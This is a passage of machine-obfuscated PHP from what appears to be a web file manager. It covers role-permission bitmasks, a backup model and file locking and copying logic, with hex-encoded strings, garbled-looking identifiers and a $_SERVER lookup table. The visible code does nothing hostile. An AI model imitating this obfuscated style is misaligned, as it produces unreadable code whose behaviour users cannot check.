$field = array("\x6e\x61\x6d\145", "\x61\x75\164\150", "\154\141\142\x65\154", "\x64\151\163\160\154\141\171", "\x73\171\x73\164\x65\x6d", "\x73\157\x72\x74"); public function initData() { $‰ö‰®šİ = $this->authDefault(); foreach ($‰ö‰®šİ as $‰ÕÙ²ç) { $this->add($‰ÕÙ²ç); } } public function findAuth($‘Š»Âï§, $¯å£Õ‘¼) { $®ÇâøÅš =& $_SERVER[¿ğÚ‰±–]; $‡â§¼  = parent::listData(); foreach ($‡â§¼  as $‚Ë½ÜéÚ) { $£ù–Ù¨ = intval($‚Ë½ÜéÚ[$®ÇâøÅš[487]]); if ($£ù–Ù¨ <= 0 || $‚Ë½ÜéÚ[$®ÇâøÅš[1998]] == 0) { continue; } if (($£ù–Ù¨ & $‘Š»Âï§) != $‘Š»Âï§) { continue; } if (($£ù–Ù¨ & $¯å£Õ‘¼) != 0) { continue; } return $‚Ë½ÜéÚ[$®ÇâøÅš[475]]; } return !1; } public function findAuthReadOnly() { $®¹ø³‰Ğ = self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD; $èñ‰À¢’ = self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE; return $this->findAuth($®¹ø³‰Ğ, $èñ‰À¢’); } public function findAuthNotRead() { return $this->findAuth(0, self::AUTH_SHOW); } public function findAuthMinDefault() { $€Å¾­Í‰ =& $_SERVER[¿ğÚ‰±–]; $œ­ÓÁø¨ = parent::listData(); $ºì«ÆÌ = !1; foreach ($œ­ÓÁø¨ as $†ä€œ÷ü) { if ($†ä€œ÷ü[$€Å¾­Í‰[487]] <= 0 || $†ä€œ÷ü[$€Å¾­Í‰[1998]] == $€Å¾­Í‰[228]) { continue; } if (!$ºì«ÆÌ) { $ºì«ÆÌ = $†ä€œ÷ü; continue; } if ($ºì«ÆÌ[$€Å¾­Í‰[487]] > $†ä€œ÷ü[$€Å¾­Í‰[487]]) { $ºì«ÆÌ = $†ä€œ÷ü; } } return $ºì«ÆÌ ? $ºì«ÆÌ[$€Å¾­Í‰[475]] : $€Å¾­Í‰[12]; } public function listData($ÎÏÇÙ÷À = false, $Ğ›á€Õ± = "\163\157\162\164", $ëŠéÌÇ = false) { return parent::listData($ÎÏÇÙ÷À, $Ğ›á€Õ±, $ëŠéÌÇ); } public function update($©şñĞí˜, $ğ…Š‡¼Û) { $Æ¹ÕËİƒ =& $_SERVER[¿ğÚ‰±–]; $‹Ô ïü³ = parent::listData($©şñĞí˜); $Û÷¼­¼ = $this->findByName($ğ…Š‡¼Û[$Æ¹ÕËİƒ[32]]); if (!$‹Ô ïü³ || $Û÷¼­¼ && $Û÷¼­¼[$Æ¹ÕËİƒ[475]] != $‹Ô ïü³[$Æ¹ÕËİƒ[475]]) { return !1; } $this->filterAuth($ğ…Š‡¼Û[$Æ¹ÕËİƒ[487]]); return parent::update($©şñĞí˜, $ğ…Š‡¼Û); } public function remove($µ”ø©·Ê) { $ÏË¬¹¯« = parent::listData($µ”ø©·Ê); if (!$ÏË¬¹¯« || $ÏË¬¹¯«[$_SERVER[¿ğÚ‰±–][191]]) { return !1; } return parent::remove($µ”ø©·Ê); } public function add($–ıøº• = array()) { $†É¼¨ö =& $_SERVER[¿ğÚ‰±–]; if ($this->findByName($–ıøº•[$†É¼¨ö[32]])) { return !1; } $ÁøŸ¦“° = array($†É¼¨ö[32] => $†É¼¨ö[12], $†É¼¨ö[487] => 1, $†É¼¨ö[1999] => $†É¼¨ö[1986], $†É¼¨ö[1998] => 1, $†É¼¨ö[191] => 0, $†É¼¨ö[2000] => 0); $–ıøº• = array_merge($ÁøŸ¦“°, $–ıøº•); $–ıøº•[$†É¼¨ö[2000]] = $this->getSort(); $this->filterAuth($–ıøº•[$†É¼¨ö[487]]); return parent::insert($–ıøº•); } private function getSort() { $ÕÄËÂºË =& $_SERVER[¿ğÚ‰±–]; $İ‡ôÙüˆ = parent::listData(); $ñÙ±”ûü = array_to_keyvalue($İ‡ôÙüˆ, $ÕÄËÂºË[12], $ÕÄËÂºË[2000]); return empty($ñÙ±”ûü) ? 0 : max($ñÙ±”ûü) + 1; } private function filterAuth(&$¥„ÈÓ) { if (!$¥„ÈÓ) { return; } $ÌÑ¢Ô¸Â = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $¥Ô™¯¯ï = array(); foreach ($ÌÑ¢Ô¸Â as $»¾ï–™ò) { if ($¥„ÈÓ & $»¾ï–™ò) { $¥Ô™¯¯ï[] = $»¾ï–™ò; } } if (in_array(self::AUTH_ROOT, $¥Ô™¯¯ï)) { $¥„ÈÓ = array_sum($ÌÑ¢Ô¸Â); return; } $Ïº¦Œ¡È = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); foreach ($¥Ô™¯¯ï as $»¾ï–™ò) { if (isset($Ïº¦Œ¡È[$»¾ï–™ò])) { $¥Ô™¯¯ï = array_merge($¥Ô™¯¯ï, $Ïº¦Œ¡È[$»¾ï–™ò]); } } $¥Ô™¯¯ï[] = self::AUTH_SHOW; $¥„ÈÓ = array_sum(array_unique($¥Ô™¯¯ï)); } public function sort($ÃÃÂîÊˆ, $í–…µ­) { return parent::update($ÃÃÂîÊˆ, $í–…µ­); } } class BackupModel extends ModelBaseLight { public $optionType = "\x53\x79\163\164\x65\155\56\142\141\x63\153\x75\160\114\151\x73\x74"; public $field = array("\x69\x6f", "\156\x61\155\x65", "\163\164\141\164\x75\163", "\143\x6f\x6e\164\145\x6e\x74", "\x6d\141\156\x75\141\154", "\162\x65\163\x75\154\164", "\x74\151\x6d\x65\106\162\x6f\x6d", "\164\151\x6d\145\x54\x6f"); public function config() { $İÊµòÎœ =& $_SERVER[¿ğÚ‰±–]; Action($İÊµòÎœ[2001])->taskInit(); $ø¤à«Ö§ = Model($İÊµòÎœ[848])->get($İÊµòÎœ[861]); $ø¤à«Ö§ = json_decode($ø¤à«Ö§, !0); $ø¤à«Ö§ = is_array($ø¤à«Ö§) ? $ø¤à«Ö§ : array(); $this->parseContent($ø¤à«Ö§); unset($ø¤à«Ö§[$İÊµòÎœ[1747]]); Model($İÊµòÎœ[1746])->cacheClear(); $üÓÔí¡ = $İÊµòÎœ[2002]; $‹Ğùş÷ı = Model($İÊµòÎœ[2003])->findByKey($İÊµòÎœ[1765], $üÓÔí¡); if (!$‹Ğùş÷ı) { $‹Ğùş÷ı = array(); } if (isset($‹Ğùş÷ı[$İÊµòÎœ[206]])) { $‹Ğùş÷ı[$İÊµòÎœ[206]] = json_decode($‹Ğùş÷ı[$İÊµòÎœ[206]], !0); } if (isset($ø¤à«Ö§[$İÊµòÎœ[206]])) { $‹Ğùş÷ı[$İÊµòÎœ[206]][$İÊµòÎœ[1750]] = $ø¤à«Ö§[$İÊµòÎœ[206]]; unset($ø¤à«Ö§[$İÊµòÎœ[206]]); } return array_merge($‹Ğùş÷ı, $ø¤à«Ö§); } public function listData($øÊĞØ = false, $†¤ÏÄ° = "\x6d\157\144\x69\x66\x79\124\x69\155\145", $¯˜¥ÓÑª = false) { $¢üúá× = parent::listData($øÊĞØ, $†¤ÏÄ°, !0); if (!$¢üúá×) { return $¢üúá×; } if ($øÊĞØ) { $¢üúá× = array($¢üúá×); } foreach ($¢üúá× as &$¢œãõ‡Ô) { $this->parseContent($¢œãõ‡Ô); } return $øÊĞØ ? $¢üúá×[0] : $¢üúá×; } public function parseContent(&$»®Üš–š) { $‡à—Á¼ê =& $_SERVER[¿ğÚ‰±–]; $‡ÚÆ¬òÕ = _get($»®Üš–š, $‡à—Á¼ê[171], $‡à—Á¼ê[91]); if (!in_array($‡ÚÆ¬òÕ, array($‡à—Á¼ê[854], $‡à—Á¼ê[1218]))) { $»®Üš–š[$‡à—Á¼ê[171]] = $‡ÚÆ¬òÕ == $‡à—Á¼ê[91] ? $‡à—Á¼ê[1218] : $‡à—Á¼ê[854]; } } public function lastItem() { $ÑåÎ¨î = $this->listData(); return !empty($ÑåÎ¨î[0]) ? $ÑåÎ¨î[0] : null; } public function kill($Âòõíó) { $ºÆªŸÊÊ =& $_SERVER[¿ğÚ‰±–]; $ø©û°£ø = $this->listData($Âòõíó); if (!$ø©û°£ø || empty($ø©û°£ø[$ºÆªŸÊÊ[32]])) { return !0; } Task::kill($ºÆªŸÊÊ[860]); Task::kill($ºÆªŸÊÊ[878]); Task::kill($ºÆªŸÊÊ[887]); $«Üº¼¶¼ = $ø©û°£ø[$ºÆªŸÊÊ[32]]; $¹åÉ£ = TEMP_FILES . $ºÆªŸÊÊ[857] . $«Üº¼¶¼ . $ºÆªŸÊÊ[8]; IO::remove($¹åÉ£, !1); return $this->remove($Âòõíó); } public function remove($ù‰§Äì˜) { $Ôã×€â = $this->listData($ù‰§Äì˜); if (!$Ôã×€â) { return !0; } return $this->backupRemove($Ôã×€â); } private function backupRemove($É‘š®Û) { parent::remove($É‘š®Û[$_SERVER[¿ğÚ‰±–][475]]); $òïü¿‚ß = $this->backupPath($É‘š®Û); IO::remove($òïü¿‚ß, !1); return !0; } private function backupPath($©À±¬…) { $¤ŞÎ×„‡ =& $_SERVER[¿ğÚ‰±–]; $¯Ì¸®ˆÎ = $©À±¬…[$¤ŞÎ×„‡[32]]; $¹©Í­šç = Model($¤ŞÎ×„‡[848])->get($¤ŞÎ×„‡[849]); $„ë»öó‹ = substr(md5($¤ŞÎ×„‡[850] . $¹©Í­šç . $¯Ì¸®ˆÎ), 0, 8); return "\x7b\x69\x6f\x3a{$©À±¬…[$¤ŞÎ×„‡[830]]}\175\57\x64\x61\x74\141\142\x61\x73\145\x2f\x62\x61\143\x6b\x75\160\x2f" . $¯Ì¸®ˆÎ . $¤ŞÎ×„‡[11] . $„ë»öó‹; } public function start() { $ÎÙŞ˜§½ =& $_SERVER[¿ğÚ‰±–]; if ($GLOBALS[$ÎÙŞ˜§½[6]][$ÎÙŞ˜§½[92]][$ÎÙŞ˜§½[2004]] != $ÎÙŞ˜§½[91]) { return !0; } $½¿Ñ¨ó² = $this->config(); if (!$½¿Ñ¨ó² || $½¿Ñ¨ó²[$ÎÙŞ˜§½[1747]] != $ÎÙŞ˜§½[91]) { return !1; } if ($½¿Ñ¨ó²[$ÎÙŞ˜§½[171]] == $ÎÙŞ˜§½[854]) { $¼¦™òÃ = Model($ÎÙŞ˜§½[848])->get($ÎÙŞ˜§½[1331]); if ($¼¦™òÃ == $ÎÙŞ˜§½[1332]) { $½¿Ñ¨ó²[$ÎÙŞ˜§½[171]] = $ÎÙŞ˜§½[1218]; } } $Ø¢Ï¬ÒÃ = $this->process(); foreach ($Ø¢Ï¬ÒÃ as $´ŸÍ¸ı‰) { if ($´ŸÍ¸ı‰) { return Task::restart($´ŸÍ¸ı‰[$ÎÙŞ˜§½[475]]); } } $³Ã¥ğ‚— = new Backup(); $ÛÉ¼Úû = $³Ã¥ğ‚—->db(); if ($ÛÉ¼Úû) { $ÛÉ¼Úû = $³Ã¥ğ‚—->dbFile(); if ($ÛÉ¼Úû && $½¿Ñ¨ó²[$ÎÙŞ˜§½[171]] == $ÎÙŞ˜§½[854]) { $ÛÉ¼Úû = $³Ã¥ğ‚—->file(); } } Backup::set(array($ÎÙŞ˜§½[828] => 1, $ÎÙŞ˜§½[839] => time())); return !0; } public function process() { $İÌŠ×ËÁ =& $_SERVER[¿ğÚ‰±–]; $¤ï›Ñ = array($İÌŠ×ËÁ[835] => Task::get($İÌŠ×ËÁ[860]), $İÌŠ×ËÁ[840] => Task::get($İÌŠ×ËÁ[878]), $İÌŠ×ËÁ[230] => Task::get($İÌŠ×ËÁ[887])); $Áô¼š™ = !1; foreach ($¤ï›Ñ as &$¥ıĞƒ¶) { if ($Áô¼š™) { $¥ıĞƒ¶ = !1; continue; } if ($¥ıĞƒ¶) { $Èç¡Ş«Ş = intval(_get($¥ıĞƒ¶, $İÌŠ×ËÁ[1782], 0)); if (time() - $Èç¡Ş«Ş > 7200) { Task::kill($¥ıĞƒ¶[$İÌŠ×ËÁ[475]]); $Áô¼š™ = !0; $¥ıĞƒ¶ = !1; } } } return $¤ï›Ñ; } public function restore() { $Ú¾§ÒÄä =& $_SERVER[¿ğÚ‰±–]; ActionCall($Ú¾§ÒÄä[1145], !0, 1); ActionCall($Ú¾§ÒÄä[1145], !0, 0); } } goto c¬‘ò›ÓŸ¾; aïä‡ƒ‰¿: class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($¼¢‚ıà°) { $¸èøò‡ =& $_SERVER[¿ğÚ‰±–]; if (!$this->allowLock()) { return; } $this->_lockCheck($¸èøò‡[618], $¼¢‚ıà°); $‹Ç¢¦šÈ = 1; $this->_lockEvent($¼¢‚ıà°, array($¸èøò‡[619], $¸èøò‡[620]), $‹Ç¢¦šÈ); $this->_lockParent($¼¢‚ıà°, array($¸èøò‡[620]), $‹Ç¢¦šÈ); $this->_lockEvent($¼¢‚ıà°, array($¸èøò‡[621], $¸èøò‡[622]), $‹Ç¢¦šÈ); $this->_lockCheckEnd($¸èøò‡[618], $¼¢‚ıà°); } public function lockCopyEnd($õÌ’èñ) { $œ±ã·¨† =& $_SERVER[¿ğÚ‰±–]; if (!$this->allowLock()) { return; } $ËÛ¼˜¹ = 0; $this->_lockEvent($õÌ’èñ, array($œ±ã·¨†[619], $œ±ã·¨†[620]), $ËÛ¼˜¹); $this->_lockParent($õÌ’èñ, array($œ±ã·¨†[620]), $ËÛ¼˜¹); $this->_lockEvent($õÌ’èñ, array($œ±ã·¨†[621], $œ±ã·¨†[622]), $ËÛ¼˜¹); } public function lockWriteStart($²“¦Û¾à, $“š°è¢ = '') { $ÒË»ìÆù =& $_SERVER[¿ğÚ‰±–]; if (!$this->allowLock()) { return; } $this->_lockCheck($ÒË»ìÆù[619], $²“¦Û¾à); $°©šÚî† = 1; $this->_lockKey($ÒË»ìÆù[623] . $²“¦Û¾à . $ÒË»ìÆù[10] . $“š°è¢, $°©šÚî†); $this->_lockEvent($²“¦Û¾à, array($ÒË»ìÆù[618], $ÒË»ìÆù[620]), $°©šÚî†); $this->_lockParent($²“¦Û¾à, array($ÒË»ìÆù[618], $ÒË»ìÆù[620]), $°©šÚî†); $this->_lockCheckEnd($ÒË»ìÆù[619], $²“¦Û¾à); } public function lockWriteEnd($›İÆı­, $ÃĞïşèÙ = '') { $áß„Ê¢‹ =& $_SERVER[¿ğÚ‰±–]; if (!$this->allowLock()) { return; } $“ÉæÇ›Œ = 0; $this->_lockKey($áß„Ê¢‹[623] . $›İÆı­ . $áß„Ê¢‹[10] . $ÃĞïşèÙ, $“ÉæÇ›Œ); $this->_lockEvent($›İÆı­, array($áß„Ê¢‹[618], $áß„Ê¢‹[620]), $“ÉæÇ›Œ); $this->_lockParent($›İÆı­, array($áß„Ê¢‹[618], $áß„Ê¢‹[620]), $“ÉæÇ›Œ); } public function lockMoveStart($º¦¿ÈÙ) { $æéÊ¸õØ =& $_SERVER[¿ğÚ‰±–]; if (!$this->allowLock()) { return; } $this->_lockCheck($æéÊ¸õØ[620], $º¦¿ÈÙ); $åşíïû¸ = 1; $this->_lockKey($æéÊ¸õØ[624] . $º¦¿ÈÙ, $åşíïû¸); $this->_lockEvent($º¦¿ÈÙ, array($æéÊ¸õØ[618], $æéÊ¸õØ[619]), $åşíïû¸); $this->_lockParent($º¦¿ÈÙ, array($æéÊ¸õØ[618], $æéÊ¸õØ[620]), $åşíïû¸); $this->_lockEvent($º¦¿ÈÙ, array($æéÊ¸õØ[625], $æéÊ¸õØ[621], $æéÊ¸õØ[622]), $åşíïû¸); $this->_lockCheckEnd($æéÊ¸õØ[620], $º¦¿ÈÙ); } public function lockMoveEnd($ø½Î–ô) { $¡‡øÎ— =& $_SERVER[¿ğÚ‰±–]; if (!$this->allowLock()) { return; } $êØ‘ØÆÒ = 0; $this->_lockKey($¡‡øÎ—[624] . $ø½Î–ô, $êØ‘ØÆÒ); $this->_lockEvent($ø½Î–ô, array($¡‡øÎ—[618], $¡‡øÎ—[619]), $êØ‘ØÆÒ); $this->_lockParent($ø½Î–ô, array($¡‡øÎ—[618], $¡‡øÎ—[620]), $êØ‘ØÆÒ); $this->_lockEvent($ø½Î–ô, array($¡‡øÎ—[625], $¡‡øÎ—[621], $¡‡øÎ—[622]), $êØ‘ØÆÒ); } private function _lockCheck($Î–¨Ì¿¹, $”®ÁÓÊÛ) { $»™â ˜ =& $_SERVER[¿ğÚ‰±–]; $„áóÇ = $this->sourceInfo($”®ÁÓÊÛ); $‰é…°Å‰ = $Î–¨Ì¿¹ . $»™â ˜[10] . $”®ÁÓÊÛ; $this->_lockTimeStart[$‰é…°Å‰] = timeFloat(); if (!is_array($„áóÇ)) { return; } $öäş¢· = LNG($»™â ˜[626]); CacheLock::setErrorMsg($»™â ˜[176] . htmlspecialchars($„áóÇ[$»™â ˜[32]]) . $»™â ˜[178] . $öäş¢·); $this->_lockKey($‰é…°Å‰, 1); $this->_lockKey($‰é…°Å‰, 0); $Çó²¨“¤ = array_reverse($this->parentLevelArray($„áóÇ[$»™â ˜[584]])); foreach ($Çó²¨“¤ as $¬æ¯³öå) { $‰é…°Å‰ = $Î–¨Ì¿¹ . $»™â ˜[627] . $¬æ¯³öå; if (CacheLock::lockGet($»™â ˜[628] . $‰é…°Å‰)) { $„áóÇ = $this->sourceInfo($¬æ¯³öå); CacheLock::setErrorMsg($»™â ˜[176] . htmlspecialchars($„áóÇ[$»™â ˜[32]]) . $»™â ˜[178] . $öäş¢·); $this->_lockKey($‰é…°Å‰, 1); $this->_lockKey($‰é…°Å‰, 0); } } } private function _lockCheckEnd($ï§£šØŸ, $òÜò) { $—ßˆØ’‘ =& $_SERVER[¿ğÚ‰±–]; $ì’±Ûàñ = $ï§£šØŸ . $—ßˆØ’‘[10] . $òÜò; CacheLock::setErrorMsg($—ßˆØ’‘[454]); if (!isset($this->_lockTimeStart[$ì’±Ûàñ])) { return; } $ÙøïËÔ¹ = timeFloat() - $this->_lockTimeStart[$ì’±Ûàñ]; unset($this->_lockTimeStart[$ì’±Ûàñ]); if ($ÙøïËÔ¹ > 0.5) { unset(self::$cacheSourceInfo[$—ßˆØ’‘[533] . $òÜò]); } $çı×À­Ñ = $this->sourceInfo($òÜò); if (!$çı×À­Ñ) { show_json(LNG($—ßˆØ’‘[108]), !1); } } private function _lockParent($ç³†Ù¯, $¡èœªé«, $´ĞÁË§¾) { if (!$this->autoLockSet) { return; } $Úé’§ãâ = $this->sourceInfo($ç³†Ù¯); if (!is_array($Úé’§ãâ)) { return; } $ŠØòè·¿ = array_reverse($this->parentLevelArray($Úé’§ãâ[$_SERVER[¿ğÚ‰±–][584]])); foreach ($ŠØòè·¿ as $¯É×­ã£) { $this->_lockEvent($¯É×­ã£, $¡èœªé«, $´ĞÁË§¾); } } private function _lockEvent($§İ‡¼‹­, $Š“’şñƒ, $•»®ş×‰) { $—­†¯Ì¸ =& $_SERVER[¿ğÚ‰±–]; if (!$this->autoLockSet) { return; } foreach ($Š“’şñƒ as $¼ËüÛ»À) { $ô¦×çÉµ = $¼ËüÛ»À . $—­†¯Ì¸[10] . $§İ‡¼‹­; if ($•»®ş×‰ && CacheLock::lockGet($—­†¯Ì¸[628] . $ô¦×çÉµ)) { continue; } $this->_lockKey($ô¦×çÉµ, $•»®ş×‰); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($íàÜ¤¬ê, $ÏÔÌàâ— = 1) { $Â¦¯ÀˆÕ = $_SERVER[¿ğÚ‰±–][628] . md5($íàÜ¤¬ê); if ($ÏÔÌàâ—) { if (isset(self::$_lockItemArr[$Â¦¯ÀˆÕ])) { return; } self::$_lockItemArr[$Â¦¯ÀˆÕ] = 1; CacheLock::lock($Â¦¯ÀˆÕ, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$Â¦¯ÀˆÕ])) { return; } unset(self::$_lockItemArr[$Â¦¯ÀˆÕ]); CacheLock::unlock($Â¦¯ÀˆÕ); } } public function isParentOf($Ûãõõòâ, $ÛÆÒ¡½) { $îİÛ—çÚ =& $_SERVER[¿ğÚ‰±–]; $İ¢ÃŸ“Œ = $this->sourceInfo($Ûãõõòâ); $‡Ã¸Ã­ª = $this->sourceInfo($ÛÆÒ¡½); $ÌÇ÷ õÁ = $İ¢ÃŸ“Œ[$îİÛ—çÚ[584]] . $İ¢ÃŸ“Œ[$îİÛ—çÚ[193]] . $îİÛ—çÚ[50]; $œã¸ûÙ = $‡Ã¸Ã­ª[$îİÛ—çÚ[584]] . $‡Ã¸Ã­ª[$îİÛ—çÚ[193]] . $îİÛ—çÚ[50]; $÷Õ«âæó = strpos($œã¸ûÙ, $ÌÇ÷ õÁ) === 0; return $÷Õ«âæó; } private $targetIsDelete = 0; public function copy($ê´µÏäû, $Âşã›Ó¤, $ğ‹Ùığ¸ = REPEAT_REPLACE, $üÑ µ§€ = '') { $¦Ó¡öÌÅ =& $_SERVER[¿ğÚ‰±–]; $¨û¶Å£ = $this->sourceInfo($ê´µÏäû); $Ô¼îå = $this->sourceInfo($Âşã›Ó¤); if (!$¨û¶Å£ || !$Ô¼îå || $Ô¼îå[$¦Ó¡öÌÅ[485]] != $¦Ó¡öÌÅ[91]) { return !1; } if ($this->isParentOf($ê´µÏäû, $Âşã›Ó¤)) { return !1; } $¤–òíÃŠ = $üÑ µ§€ ? $üÑ µ§€ : $¨û¶Å£[$¦Ó¡öÌÅ[32]]; $this->lockCopyStart($ê´µÏäû); $this->lockWriteStart($Âşã›Ó¤, $¤–òíÃŠ); $ÛËÜÃşà = array($¦Ó¡öÌÅ[629] => array(), $¦Ó¡öÌÅ[630] => array(), $¦Ó¡öÌÅ[631] => array()); $this->targetIsDelete = intval($¨û¶Å£[$¦Ó¡öÌÅ[505]]); $¹ê£ñ„¬ = $this->fileNameExistAuto($Âşã›Ó¤, $¨û¶Å£); $ÆşÀÄ¬ê = $this->_copy($ê´µÏäû, $Âşã›Ó¤, $ğ‹Ùığ¸, $ÛËÜÃşà, !0, $üÑ µ§€); $this->_childrenListClear(); $this->lockCopyEnd($ê´µÏäû); $this->lockWriteEnd($Âşã›Ó¤, $¤–òíÃŠ); if ($¨û¶Å£[$¦Ó¡öÌÅ[485]] == $¦Ó¡öÌÅ[91] && $¹ê£ñ„¬ == $ÆşÀÄ¬ê) { $this->folderSizeResetChildren($¹ê£ñ„¬); } Model($¦Ó¡öÌÅ[632])->addAll($ÛËÜÃşà[$¦Ó¡öÌÅ[630]], array(), !0); if ($¹ê£ñ„¬ != $ÆşÀÄ¬ê || $¨û¶Å£[$¦Ó¡öÌÅ[485]] == $¦Ó¡öÌÅ[91]) { Model($¦Ó¡öÌÅ[633])->eventCopy($ÆşÀÄ¬ê); } $this->saveAll($ÛËÜÃşà[$¦Ó¡öÌÅ[631]]); Model($¦Ó¡öÌÅ[230])->linkAdd($ÛËÜÃşà[$¦Ó¡öÌÅ[629]]); $this->folderSizeReset($Âşã›Ó¤); $this->updateModifyTime($Âşã›Ó¤); return $ÆşÀÄ¬ê; } private function _copy($˜Â¥ÃÙ, $ü¤Ÿ¶¥, $åÑáÀœš, &$È¤íçó¯, $Ö–’”¤ˆ, $àÕè‚¸€ = '') { $¼Â˜×Â§ =& $_SERVER[¿ğÚ‰±–]; $ı¬¥‰¶„ = $this->sourceInfoCache($˜Â¥ÃÙ); $ú¼É¢»Ù = $ı¬¥‰¶„[$¼Â˜×Â§[485]] == $¼Â˜×Â§[91]; $™Å²¦…Ğ = $àÕè‚¸€ ? $àÕè‚¸€ : $ı¬¥‰¶„[$¼Â˜×Â§[32]]; $ËÕÙ¸÷¦ = $this->fileNameExistAuto($ü¤Ÿ¶¥, $ı¬¥‰¶„); if ($Ö–’”¤ˆ) { $this->_childrenAllMake($˜Â¥ÃÙ); if ($ú¼É¢»Ù && $ËÕÙ¸÷¦) { $this->_childrenAllMake($ËÕÙ¸÷¦); } } if (!$ËÕÙ¸÷¦) { return $this->_copyCreate($˜Â¥ÃÙ, $ü¤Ÿ¶¥, $™Å²¦…Ğ, $È¤íçó¯); } $£Â™Â = $ËÕÙ¸÷¦; if ($ú¼É¢»Ù) { if ($åÑáÀœš == REPEAT_RENAME_FOLDER) { $™Å²¦…Ğ = $this->fileNameAutoCache($ü¤Ÿ¶¥, $™Å²¦…Ğ, $åÑáÀœš, $ú¼É¢»Ù); $£Â™Â = $this->_copyCreate($˜Â¥ÃÙ, $ü¤Ÿ¶¥, $™Å²¦…Ğ, $È¤íçó¯); } else { $Øê¤Å¢û = $this->_childrenList($˜Â¥ÃÙ); foreach ($Øê¤Å¢û as $€Ó•È¥™) { $this->_copy($€Ó•È¥™[$¼Â˜×Â§[193]], $ËÕÙ¸÷¦, $åÑáÀœš, $È¤íçó¯, !1); } } } else { if ($åÑáÀœš == REPEAT_RENAME || $åÑáÀœš == REPEAT_RENAME_FOLDER) { $™Å²¦…Ğ = $this->fileNameAutoCache($ü¤Ÿ¶¥, $™Å²¦…Ğ, $åÑáÀœš, $ú¼É¢»Ù); $£Â™Â = $this->_copyCreate($˜Â¥ÃÙ, $ü¤Ÿ¶¥, $™Å²¦…Ğ, $È¤íçó¯); } else { if ($åÑáÀœš == REPEAT_REPLACE) { $Ì÷Î€£å = $this->sourceInfoCache($ËÕÙ¸÷¦); $âÇ­ûıì = $this->fileHistory($Ì÷Î€£å, $ı¬¥‰¶„[$¼Â˜×Â§[541]], $ı¬¥‰¶„[$¼Â˜×Â§[79]]); if ($âÇ­ûıì) { $È¤íçó¯[$¼Â˜×Â§[629]][] = $ı¬¥‰¶„[$¼Â˜×Â§[541]]; } } else { if ($åÑáÀœš == REPEAT_SKIP) { } } } Hook::trigger($¼Â˜×Â§[634], array($¼Â˜×Â§[635], $ı¬¥‰¶„, 0)); } return $£Â™Â; } private function _copyCreate($»‹Ş–Ï¡, $—µ•§Ù¸, $ßÉå€€, &$ ‘Şä¢) { $£ˆŒ¹Ú² =& $_SERVER[¿ğÚ‰±–]; $ãŞ†ïÓ² = $this->sourceInfoCache($»‹Ş–Ï¡); $¶ì—ôßÑ = $this->sourceInfoCache($—µ•§Ù¸); $áéíó¥¿ = $this->_makeItemData($ãŞ†ïÓ², $¶ì—ôßÑ, $ßÉå€€); Hook::trigger($£ˆŒ¹Ú²[636], $áéíó¥¿); Hook::trigger($£ˆŒ¹Ú²[637], array($£ˆŒ¹Ú²[638], $áéíó¥¿, 0)); $í¦¬å­Í = $this->add($áéíó¥¿); $­İÓƒç = array($£ˆŒ¹Ú²[193] => $í¦¬å­Í, $£ˆŒ¹Ú²[32] => $ßÉå€€); $this->_copyApplyMeta($­İÓƒç, $ ‘Şä¢); if ($ãŞ†ïÓ²[$£ˆŒ¹Ú²[485]] != $£ˆŒ¹Ú²[91]) { $ ‘Şä¢[$£ˆŒ¹Ú²[629]][] = $ãŞ†ïÓ²[$£ˆŒ¹Ú²[541]]; return $í¦¬å­Í; } $¯×İßáŠ = array(); $‚Í‹ŸĞ = array(); $this->_childrenListAll($»‹Ş–Ï¡, $¯×İßáŠ); $„ëÔÂ‰È = count($¯×İßáŠ); if ($„ëÔÂ‰È == 0) { return $í¦¬å­Í; } $àû„Èú« = $this->sourceInfo($í¦¬å­Í); foreach ($¯×İßáŠ as $Â¾À“êÚ) { $òÈªˆ—„ = $this->_makeItemData($Â¾À“êÚ, $àû„Èú«, $Â¾À“êÚ[$£ˆŒ¹Ú²[32]]); $òÈªˆ—„[$£ˆŒ¹Ú²[584]] = $Â¾À“êÚ[$£ˆŒ¹Ú²[584]]; $‚Í‹ŸĞ[] = $òÈªˆ—„; } $this->chunkEventSet($£ˆŒ¹Ú²[639], array($£ˆŒ¹Ú²[640], $áéíó¥¿, $„ëÔÂ‰È)); $this->addAll($‚Í‹ŸĞ, array(), !1); $Æà¼«Úè = $this->where(array($£ˆŒ¹Ú²[192] => $í¦¬å­Í))->select(); $ÇÆı™û’ = $this->_childrenMakeRelation($¯×İßáŠ, $Æà¼«Úè); $ÇÆı™û’[$»‹Ş–Ï¡] = $í¦¬å­Í; $›¸µ­ŸÙ = array(); $ÛšãÊ…· = array(); foreach ($Æà¼«Úè as $Â¾À“êÚ) { $›³è©¬˜ = $Â¾À“êÚ[$£ˆŒ¹Ú²[193]]; $Ê–çö ™ = $this->_childrenMatch($ÇÆı™û’, $Â¾À“êÚ, $àû„Èú«); $›¸µ­ŸÙ[] = array($£ˆŒ¹Ú²[193], $›³è©¬˜, $£ˆŒ¹Ú²[192], $Ê–çö ™[$£ˆŒ¹Ú²[192]]); $ÛšãÊ…·[] = array($£ˆŒ¹Ú²[193], $›³è©¬˜, $£ˆŒ¹Ú²[584], $Ê–çö ™[$£ˆŒ¹Ú²[584]]); $this->_copyApplyMeta($Â¾À“êÚ, $ ‘Şä¢); if ($Â¾À“êÚ[$£ˆŒ¹Ú²[485]] != $£ˆŒ¹Ú²[91]) { $ ‘Şä¢[$£ˆŒ¹Ú²[629]][] = $Â¾À“êÚ[$£ˆŒ¹Ú²[541]]; } } $this->chunkEventSet($£ˆŒ¹Ú²[641], array($£ˆŒ¹Ú²[642], $áéíó¥¿, $„ëÔÂ‰È)); $this->saveAll($›¸µ­ŸÙ); $this->chunkEventSet($£ˆŒ¹Ú²[643], 